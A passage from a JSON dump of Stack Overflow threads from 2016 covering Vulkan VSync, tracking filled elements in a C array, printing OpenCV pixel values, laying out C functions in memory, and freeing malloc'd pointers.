17, "last_activity_date": 1461823015, "last_edit_date": 1461823015, "creation_date": 1461790182, "answer_id": 36900602, "question_id": 36896021, "link": "https://stackoverflow.com/questions/36896021/enabling-vsync-in-vulkan/36900602#36900602", "title": "Enabling VSync in Vulkan", "body": "<p>Though you could realize that by using a fence the correct way would be to use a presentation mode that waits for the vertical blank like VK_PRESENT_MODE_FIFO_KHR. </p>\n\n<p>Intel has a great article that contains a detailed look at Vulkan's different presentation modes <a href=\"https://software.intel.com/en-us/api-without-secrets-introduction-to-vulkan-part-2?language=en#_Toc445674479\">over here</a></p>\n\n<p>Note that this mode may not be available on every device and that some drivers may ignore the v-sync even if you select a corresponding presentation mode. So if you use one of these modes and don't get v-sync you may have to wait for a newer driver.</p>\n\n<p>But if it's implemented inside the driver this is the correct way of doing v-sync across all platforms supported by Vulkan.</p>\n"}], "owner": {"reputation": 7060, "user_id": 105466, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/jMWs6.png?s=128&g=1", "display_name": "SurvivalMachine", "link": "https://stackoverflow.com/users/105466/survivalmachine"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6770, "favorite_count": 3, "accepted_answer_id": 36900602, "answer_count": 1, "score": 12, "last_activity_date": 1461855742, "creation_date": 1461775719, "question_id": 36896021, "link": "https://stackoverflow.com/questions/36896021/enabling-vsync-in-vulkan", "title": "Enabling VSync in Vulkan", "body": "<p>How do I use vsync in Vulkan? I'm on Windows, but the code should also work on Linux. Is it implemented by inserting a fence in <code>vkAcquireNextImageKHR</code>?</p>\n"}, {"tags": ["c", "arrays", "size", "elements"], "comments": [{"owner": {"reputation": 3958, "user_id": 2819719, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/10551eddf1a7e1196ac8a52d0215fcff?s=128&d=identicon&r=PG&f=1", "display_name": "mihai", "link": "https://stackoverflow.com/users/2819719/mihai"}, "edited": false, "score": 1, "creation_date": 1461776181, "post_id": 36895562, "comment_id": 61356532, "body": "It&#39;s for you to decide if the values you have in the array are valid or they are just junk. There is always something in your array because every address in memory contains something. If you have an <a href=\"https://en.wikipedia.org/wiki/Automatic_variable\" rel=\"nofollow noreferrer\">automatic variable</a>, the initial contents of the array are what happens to be at that address in memory where your array is stored. If you have a <a href=\"https://en.wikipedia.org/wiki/Static_variable\" rel=\"nofollow noreferrer\">static variable</a>, then the contents of the array are initially zero."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1461778088, "post_id": 36895562, "comment_id": 61357832, "body": "If you were expecting the array to automatically keep track of this for you somehow, if you wanted a way to &quot;ask&quot; the array how many elements you&#39;ve filled in, I&#39;m afraid you&#39;re out of luck.  You have to keep track of this yourself somehow.  (In other words, C arrays are <i>not</i> C++ std::vectors.)"}], "answers": [{"comments": [{"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1461775665, "post_id": 36895677, "comment_id": 61356207, "body": "With regards to approach 2 (which is indeed preferred), it is common to write <code>array[numFilledElements++] = whatever</code>.  A great way to understand the difference between prefix and postfix <code>++</code> is to observe why postfix <code>++</code> is what you want here, while prefix would not do the right thing.  (It turns out that you might want prefix if you had a 1-based array, though.)"}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1461775841, "post_id": 36895677, "comment_id": 61356318, "body": "@SteveSummit, it&#39;s hard for me to assess how common it is to combine the setting of the value of the element and incrementing the counter to one statement but I personally separate them into two statements."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1461775865, "post_id": 36895677, "comment_id": 61356336, "body": "Recommend using <code>size_t</code> rather than <code>int</code> for <code>numFilledElements</code>."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1461775926, "post_id": 36895677, "comment_id": 61356374, "body": "@chux, I second that."}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 3, "last_activity_date": 1461775915, "last_edit_date": 1461775915, "creation_date": 1461774548, "answer_id": 36895677, "question_id": 36895562, "link": "https://stackoverflow.com/questions/36895562/number-of-declared-elements-in-an-array-c/36895677#36895677", "title": "Number of declared elements in an array c", "body": "<blockquote>\n  <p>What should I do to know that I have already \"used\" five elements of my array? How would I know the number of elements that I have used?</p>\n</blockquote>\n\n<p>There are couple of options.</p>\n\n<ol>\n<li><p>Use a sentinel value that indicates the elements that have been filled up.\nLet's say you use <code>99999</code> for the sentinel value. If the <code>n</code>-th element of the array has the value <code>99999</code>, you know that you have filled up <code>n-1</code> elements.</p></li>\n<li><p>Use another variable to keep track of that.</p>\n\n<pre><code>size_t numFilledElements = 0;\n\nfor ( ... )\n{\n   // Fill up an element\n\n   // Increment the counter.\n   ++numFilledElements;\n}\n</code></pre></li>\n</ol>\n\n<p>My personal preference would be to use the second approach. Then, you won't have to worry about a sentinel value.</p>\n"}], "owner": {"reputation": 11, "user_id": 6039461, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8604f4996b0d34f29a5a95558c6a262d?s=128&d=identicon&r=PG&f=1", "display_name": "shadowdummy", "link": "https://stackoverflow.com/users/6039461/shadowdummy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1461775915, "creation_date": 1461774198, "question_id": 36895562, "link": "https://stackoverflow.com/questions/36895562/number-of-declared-elements-in-an-array-c", "title": "Number of declared elements in an array c", "body": "<p>I have created a static array in c</p>\n\n<p><code>int array[15];</code></p>\n\n<p>For example, I \"filled in\" the first 5 elements of my array. </p>\n\n<p>This means that I still have 10 free elements, right?</p>\n\n<p>What should I do to know that I have already \"used\" five elements of my array?\nHow would I know the number of elements that I have used?</p>\n"}, {"tags": ["c++", "c", "opencv"], "comments": [{"owner": {"reputation": 3349, "user_id": 3734222, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/jmeZw.png?s=128&g=1", "display_name": "Dimitri Podborski", "link": "https://stackoverflow.com/users/3734222/dimitri-podborski"}, "edited": false, "score": 0, "creation_date": 1461774929, "post_id": 36895552, "comment_id": 61355752, "body": "Try to use <code>cout &lt;&lt; src;</code>"}, {"owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "reply_to_user": {"reputation": 3349, "user_id": 3734222, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/jmeZw.png?s=128&g=1", "display_name": "Dimitri Podborski", "link": "https://stackoverflow.com/users/3734222/dimitri-podborski"}, "edited": false, "score": 0, "creation_date": 1461775179, "post_id": 36895552, "comment_id": 61355913, "body": "@incBrain Thanks for the reply. Accurately I tried that but the result show a bit messy cause I complier and run the code by using terminal only. Is that anyway to display in more organize way?"}, {"owner": {"reputation": 3349, "user_id": 3734222, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/jmeZw.png?s=128&g=1", "display_name": "Dimitri Podborski", "link": "https://stackoverflow.com/users/3734222/dimitri-podborski"}, "edited": false, "score": 0, "creation_date": 1461775576, "post_id": 36895552, "comment_id": 61356150, "body": "I don&#39;t know what you mean by <i>display in more organize way</i>, but you can iterate over all rows and cols and do whatever you want ;)"}, {"owner": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461775826, "post_id": 36895552, "comment_id": 61356306, "body": "<code>for(int y=0; y&lt;rows; ++y) for(int x=0; x&lt;cols; ++x) std::cout &lt;&lt; &quot;(&quot;&lt;&lt;x&lt;&lt;&quot;,&quot;&lt;&lt;y&lt;&lt;&quot;) = &quot; &lt;&lt; src.at&lt;cv::Vec3b&gt;(y,x) &lt;&lt; std::endl;</code>"}, {"owner": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461775907, "post_id": 36895552, "comment_id": 61356360, "body": "instead of <code>if( !src.data )</code> I would use <code>if(src.empty())</code> should be the same result but better readability"}, {"owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "edited": false, "score": 0, "creation_date": 1461776055, "post_id": 36895552, "comment_id": 61356449, "body": "For clarification, I want to inspect the pixels value and show in the form of matrix like what the picture shows inside the link below:   <a href=\"http://docs.opencv.org/2.4/doc/tutorials/core/mat_the_basic_image_container/mat_the_basic_image_container.html\" rel=\"nofollow noreferrer\">docs.opencv.org/2.4/doc/tutorials/core/&hellip;</a>"}, {"owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "reply_to_user": {"reputation": 3349, "user_id": 3734222, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/jmeZw.png?s=128&g=1", "display_name": "Dimitri Podborski", "link": "https://stackoverflow.com/users/3734222/dimitri-podborski"}, "edited": false, "score": 0, "creation_date": 1461776284, "post_id": 36895552, "comment_id": 61356591, "body": "@incBrain but just using terminal to run the code, the result only show numbers without organize in rows and columns."}, {"owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "reply_to_user": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461776307, "post_id": 36895552, "comment_id": 61356605, "body": "@Micka Thanks micka, I will try it out now."}, {"owner": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461776387, "post_id": 36895552, "comment_id": 61356670, "body": "what&#39;s your image size? for typical resolutions you won&#39;t fit an image row in one terminal row..."}, {"owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "reply_to_user": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461776516, "post_id": 36895552, "comment_id": 61356763, "body": "@Micka using the code above the number of rows and column both is 225."}, {"owner": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461776595, "post_id": 36895552, "comment_id": 61356836, "body": "probably won&#39;t fit in the terminal rows/columns ;) my sample code prints one pixel value per terminal line."}, {"owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "reply_to_user": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461776777, "post_id": 36895552, "comment_id": 61356933, "body": "@Micka In understood now. any suggest program that can use to make a demo on that? Btw I already tried your sample code, one of the result shows as below:  (183,222) = [76, 86, 193]  From what I understand is the (183,222) represent the column and rows, but how about the 76, 86, 193?"}, {"owner": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461777018, "post_id": 36895552, "comment_id": 61357099, "body": "your color image has 3 channels. first value is the blue channel intensity. second is green channel, third is red channel. pixel intensities (each channel) range between 0 and 255 for that kind of images."}, {"owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "reply_to_user": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461777300, "post_id": 36895552, "comment_id": 61357290, "body": "@Micka Ya, I guess I asked a stupid question before I really study on it. So let say that I turn my image to edges using Canny( src, edge, 50, 150, 3); &lt;&lt;example. Can I use the same method to determine the pixel values?"}, {"owner": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461779565, "post_id": 36895552, "comment_id": 61358777, "body": "no because the canny edge image will have only one channel. you&#39;ll have to change to: <code>src.at&lt;unsigned char&gt;(y,x)</code> because cv::Vec3b is 3 byte values (24 bit from 3 channels) and <code>unsigned char</code> is a single byte (1 channel)"}, {"owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "reply_to_user": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461784871, "post_id": 36895552, "comment_id": 61362170, "body": "@Micka,  I edited my code as show as above but I fail to get the result."}, {"owner": {"reputation": 17033, "user_id": 2393191, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/mFcLT.jpg?s=128&g=1", "display_name": "Micka", "link": "https://stackoverflow.com/users/2393191/micka"}, "edited": false, "score": 0, "creation_date": 1461785140, "post_id": 36895552, "comment_id": 61362358, "body": "remove the line edge.convertTo(draw, CV_8U);"}, {"owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "edited": false, "score": 0, "creation_date": 1461785974, "post_id": 36895552, "comment_id": 61362868, "body": "The result still the same although I remove the line edge.convertTo(draw, CV_8U);"}, {"owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "edited": false, "score": 0, "creation_date": 1461786674, "post_id": 36895552, "comment_id": 61363301, "body": "It show part of the result like this:  (218,224) =  (219,224) = \ufffd (220,224) = \ufffd"}], "owner": {"reputation": 11, "user_id": 6262526, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b9fb9674ff774a13da5141bd0382d0c7?s=128&d=identicon&r=PG&f=1", "display_name": "meh", "link": "https://stackoverflow.com/users/6262526/meh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 364, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1461784814, "creation_date": 1461774151, "last_edit_date": 1461784814, "question_id": 36895552, "link": "https://stackoverflow.com/questions/36895552/display-data-from-mat-cvmat-for-an-image-in-matrix-form-opencv", "title": "Display data from Mat / cv::Mat for an image in matrix form (OpenCV)", "body": "<p>I dealing with school project now and I hopping to display the pixels value for an random image in matrix form. Below is the code I use to determine the number rows and column but I hope to get all the pixel value by columns and rows. Sorry for the bad explanation with less information cause I just getting familiar with opencv but I hope someone can really help me on this. </p>\n\n<p>Thanks</p>\n\n<pre><code>if( src.empty() )\n{ cout &lt;&lt; \"No input picture\" &lt;&lt; endl;return -1; }\n\nnamedWindow( \"Original image\", CV_WINDOW_FREERATIO );\n    imshow( \"Original image\", src);\n\n\ncvtColor(src, gray, CV_BGR2GRAY);\nnamedWindow( \"Gray image\", CV_WINDOW_FREERATIO );  \n    imshow( \"Gray image\", gray );\n\nCanny( gray, edge, 50, 150, 3);\nedge.convertTo(draw, CV_8U);\n    namedWindow(\"edge\", CV_WINDOW_FREERATIO );\n    imshow(\"edge\", draw);   \n\nint rows = draw.rows;\nint cols = draw.cols;\n\nfor(int y=0; y&lt;rows; ++y) for(int x=0; x&lt;cols; ++x) std::cout &lt;&lt; \"(\"&lt;&lt;x&lt;&lt;\",\"&lt;&lt;y&lt;&lt;\") = \" &lt;&lt; draw.at&lt;unsigned char&gt;(y,x) &lt;&lt; std::endl;\n\n//cout&lt;&lt; edge &lt;&lt;endl;   \ncout&lt;&lt;\"Number of rows:  \"&lt;&lt;draw.rows&lt;&lt;endl;\ncout&lt;&lt;\"Number of columns:  \"&lt;&lt;draw.cols&lt;&lt;endl;  \n\n\n//cout &lt;&lt; src &lt;&lt; endl;\n\n\nwaitKey(0);                                       \n    return 0;\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 1, "creation_date": 1461774226, "post_id": 36895288, "comment_id": 61355272, "body": "Use a select statement. It usually compiles to what you want."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461774452, "post_id": 36895288, "comment_id": 61355443, "body": "Why do you need functions to implement basic operators like <code>&amp;</code> and <code>==</code>? The <code>flash</code> doesn&#39;t even use the argument <code>i</code>."}, {"owner": {"reputation": 512, "user_id": 5059201, "user_type": "registered", "accept_rate": 42, "profile_image": "https://i.stack.imgur.com/hes4w.jpg?s=128&g=1", "display_name": "Sam McCreery", "link": "https://stackoverflow.com/users/5059201/sam-mccreery"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1461774616, "post_id": 36895288, "comment_id": 61355548, "body": "@WeatherVane the scenario here is just an example, the actual functions are longer but of similar complexity between them."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461774905, "post_id": 36895288, "comment_id": 61355737, "body": "You could do this by defining a control language, with instructions in an array. Those functions will almost certainly need access to the whole array of lights (for example to implement a &quot;chase&quot; pattern) but the question is far too broad."}, {"owner": {"reputation": 1135, "user_id": 5590742, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vNXUZ.png?s=128&g=1", "display_name": "jgreve", "link": "https://stackoverflow.com/users/5590742/jgreve"}, "edited": false, "score": 0, "creation_date": 1461776366, "post_id": 36895288, "comment_id": 61356650, "body": "@SamM check this out: it has examples in C (and other langs):  <a href=\"https://en.wikipedia.org/wiki/Loop_unrolling\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Loop_unrolling</a>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1461776424, "post_id": 36895288, "comment_id": 61356696, "body": "BTW, did you consider that the <code>modes + pitch*mode</code> method could be slower than <code>int (*modes)(uint8_t, uint8_t)[3]</code> approach?  A compiler could readily recognize/optimize standard code, yet non-portable code is trickier."}, {"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461776516, "post_id": 36895288, "comment_id": 61356761, "body": "As for the performance implications, both solutions are going to include an indirect jump, which I would guess under all circumstances is going to outweigh the read of a pointer. The branch predictor will have similar chances of correctly predicting the jump in either case, and if the jump is correctly predicted, then the pointer read is going to be more or less free, whereas if it is incorrectly predicted, the mispredict penalty will outweigh it."}], "answers": [{"comments": [{"owner": {"reputation": 23331, "user_id": 134252, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/azWjr.png?s=128&g=1", "display_name": "Dolda2000", "link": "https://stackoverflow.com/users/134252/dolda2000"}, "edited": false, "score": 0, "creation_date": 1461776114, "post_id": 36896095, "comment_id": 61356494, "body": "As the answer says, there&#39;s no way to do this in standard C. There <i>may</i> be ways to accomplish it in compiler-specific fashions, like inserting top-level code alignment assembler snippets in GCC, but I think those would be quite fragile. Especially if compiling with optimization. It is, indeed, probably better to just write such code directly in Assembler instead."}], "tags": [], "owner": {"reputation": 2048, "user_id": 6192747, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-agy-meieasc/AAAAAAAAAAI/AAAAAAAAAC8/ipYF1p3tygQ/photo.jpg?sz=128", "display_name": "Stian Skjelstad", "link": "https://stackoverflow.com/users/6192747/stian-skjelstad"}, "is_accepted": false, "score": 1, "last_activity_date": 1461775957, "creation_date": 1461775957, "answer_id": 36896095, "question_id": 36895288, "link": "https://stackoverflow.com/questions/36895288/place-function-instructions-successively-in-program-memory/36896095#36896095", "title": "Place function instructions successively in program memory", "body": "<p>What you are asking for is not directly available in C. But such logic can be possible in assembler, and C compilers might utilize different assembler tricks depending on CPU, optimization level etc. Try to just make the logic small and compact, mark the different functions as static, and use an switch() block in C and look at the assembler the compiler generates.</p>\n"}, {"tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": false, "score": 0, "last_activity_date": 1461777449, "last_edit_date": 1461777449, "creation_date": 1461776556, "answer_id": 36896321, "question_id": 36895288, "link": "https://stackoverflow.com/questions/36895288/place-function-instructions-successively-in-program-memory/36896321#36896321", "title": "Place function instructions successively in program memory", "body": "<p>You could use a <code>switch</code> statement, like:</p>\n\n<pre><code>#define FLASH     1\n#define ALTERNATE 2\n#define LOOP      3\n\nint patternexecute(uint8_t t, uint8_t i, int pattern)\n{\n    switch (pattern) {\n    case FLASH:     return t&amp;1;\n    case ALTERNATE: return i&amp;1 == t&amp;1;\n    case LOOP:      return i == t;\n    }\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 512, "user_id": 5059201, "user_type": "registered", "accept_rate": 42, "profile_image": "https://i.stack.imgur.com/hes4w.jpg?s=128&g=1", "display_name": "Sam McCreery", "link": "https://stackoverflow.com/users/5059201/sam-mccreery"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1461777449, "creation_date": 1461773406, "last_edit_date": 1461775350, "question_id": 36895288, "link": "https://stackoverflow.com/questions/36895288/place-function-instructions-successively-in-program-memory", "title": "Place function instructions successively in program memory", "body": "<p>Say I have a program which controls some Christmas lights <em>(this isn't the actual application, only an example)</em>. These lights have a few different calculations to determine whether a light, <code>i</code>, will be lit in a given frame, <code>t</code>. Each of <code>i</code> and <code>t</code> is a <code>uint8_t</code>, so it can be assumed that there are 256 lights and <code>t</code> will loop each 256 frames. Some light patterns could be the following:</p>\n\n<pre><code>int flash(uint8_t t, uint8_t i) {\n    return t&amp;1;}\n\nint alternate(uint8_t t, uint8_t i) {\n    return i&amp;1 == t&amp;1;}\n\nint loop(uint8_t t, uint8_t i) {\n    return i == t;}\n</code></pre>\n\n<p>If I then wanted to implement a mode-changing system that would loop through these modes, I could use a function pointer array <code>int (*modes)(uint8_t, uint8_t)[3]</code>. But, since these are all such short functions, is there any way I could instead force the compiler to place the functions directly after one another in program memory, sort of like an inline array?</p>\n\n<p>The idea would be that to access one of these functions wouldn't require evaluating the pointer, and you could instead tell the processor the correct function is at <code>modes + pitch*mode</code> where pitch is the spacing between functions (at least the length of the longest).</p>\n\n<p>I ask more out of curiosity than requirement, because I doubt this would actually cause much of a speed improvement.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461773309, "post_id": 36895196, "comment_id": 61354572, "body": "In the first example, either one, but not both. The only information that you give to <code>free</code> is the pointer&#39;s value. In the second peculiar contrivance, only one memory space is returned to the system."}, {"owner": {"reputation": 30558, "user_id": 1013719, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/U8X0A.jpg?s=128&g=1", "display_name": "Ryan Haining", "link": "https://stackoverflow.com/users/1013719/ryan-haining"}, "edited": false, "score": 1, "creation_date": 1461773335, "post_id": 36895196, "comment_id": 61354598, "body": "there is a tool called <code>valgrind</code> that I suggest you look up and start using. It will show you any memory leaks in your program (if there are any)."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1461773504, "post_id": 36895196, "comment_id": 61354719, "body": "Why is code using <code>sizeof(int)*10</code> to compute the memory needed for some pointers in <code>int** ptr1 = (int**)malloc(sizeof(int)*10);</code>.  